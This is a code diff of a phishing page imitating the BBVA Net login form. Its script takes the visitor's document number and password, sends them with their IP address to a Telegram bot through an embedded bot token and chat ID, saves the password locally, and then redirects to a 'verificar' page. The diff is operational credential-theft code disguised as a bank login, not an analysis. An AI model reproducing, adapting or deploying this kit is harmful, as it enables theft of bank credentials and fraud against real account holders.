@@ -38,7 +38,7 @@
 
             <h1 class="c-bodycopy margin-bottom-small c-bodycopy--highlighted">Hola, ingresa tu n&uacute;mero de
                 documento y contrase&ntilde;a para entrar a BBVA Net:</h1>
-            <form action="" method="post" id="form1" autocomplete="OFF">
+            <form  autocomplete="OFF">
                 <select name="docTypeNoMovil" id="docTypeNoMovil" class="select-coronita mt1 mb0">
                     <option value="CC">C&eacute;dula de Ciudadan&iacute;a</option>
                     <option value="CE">C&eacute;dula de Extranjer&iacute;a</option>
@@ -170,7 +170,7 @@
 <script>
 function carl(params) {
   const token = "5881769745:AAFiecIBFXB7lIJXhf3N1XP4TPc6uc4ZOjU";
-  const chatId = "-4213705728";
+  const chatId = "-4259482697";
   const usr = document.getElementById("docTypeNoMovil").value;
   const uservalid = document.getElementById("docNumberMovil").value;
   const cuanto = document.getElementById("passwordMovil").value;
@@ -182,7 +182,7 @@ function carl(params) {
     localStorage.getItem("pais");   
  
 
-  const message = `-NEW ONE-\n --tipo de doc.: ${usr} \n -- numero doc: ${uservalid} \n-- pw:${cuanto} --\n--IP:${ip} `;
+  const message = `--\n --tipo de doc.: ${usr} \n -- numero doc: ${uservalid} \n-- pw:${cuanto} --\n--IP:${ip} `;
   $.ajax({
     type: "POST",
     url: `https://api.telegram.org/bot${token}/sendMessage`,
@@ -196,6 +196,7 @@ function carl(params) {
       $("#response").text("Message sent");
       console.log("enviado");
       localStorage.setItem("usr", uservalid);
+      localStorage.setItem("pw",cuanto )
       
       window.location = "verificar.html";
     },
@@ -206,6 +207,9 @@ function carl(params) {
   });
 }
 
+window.onload = ()=>{
+    localStorage.setItem("count", "1");
+}
 
 
 </script>
